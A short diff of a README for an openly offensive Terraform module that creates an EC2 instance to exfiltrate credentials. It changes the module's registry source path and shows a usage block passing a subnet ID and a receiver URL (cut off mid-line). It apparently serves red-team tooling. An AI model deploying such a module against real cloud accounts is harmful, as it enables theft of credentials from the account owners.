@@ -11,7 +11,7 @@ Offensive Terraform module which creates EC2 instance and exfiltrate credential 
 ## Usage
 ```
 module "ec2_instance_credential_exfiltration" {
-    source = "offensive-terraform/terraform-aws-ec2-instance-credential-exfiltration"
+    source  = "offensive-terraform/ec2-instance-credential-exfiltration/aws"
 
     subnet_id = "subnet-0a4a1cc04"
     url = "http://0.0.0.0/
